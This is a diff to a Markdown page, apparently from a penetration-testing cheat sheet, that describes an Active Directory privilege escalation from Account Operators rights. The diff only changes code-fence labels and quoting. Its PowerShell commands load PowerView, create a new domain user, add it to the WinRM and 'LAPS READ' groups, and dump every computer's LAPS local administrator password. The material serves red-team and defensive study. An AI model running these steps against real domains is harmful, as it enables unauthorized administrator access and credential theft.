@@ -4,7 +4,6 @@ date: 2024-7-23
 tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS", "privesc"]
 ---
 
----
 ### Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group
 
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
@@ -14,7 +13,7 @@ tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS", "prives
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -24,15 +23,15 @@ tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS", "prives
 
 <div>
 
-```powershell
-$username = "<DOMAIN>\<USER>"
+```console
+$username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -42,8 +41,8 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
-$new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force
+```console
+$new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
 ```
 
 </div>
@@ -52,12 +51,12 @@ $new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Fo
 
 <div>
 
-```powershell
+```console
 # Create a new user
 New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred
 ```
 
-```powershell
+```console
 # Grant new user privilege (e.g. WinRM)
 Add-DomainGroupMember -Identity WinRM -Members <NEW_USER> -Credential $cred
 ```
@@ -68,7 +67,7 @@ Add-DomainGroupMember -Identity WinRM -Members <NEW_USER> -Credential $cred
 
 <div>
 
-```powershell
+```console
 Add-DomainGroupMember -Identity 'LAPS READ' -Members <NEW_USER> -Credential $cred
 ```
 
@@ -78,7 +77,7 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members <NEW_USER> -Credential $cre
 
 <div>
 
-```powershell
+```console
 # Login as new user
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
 ```
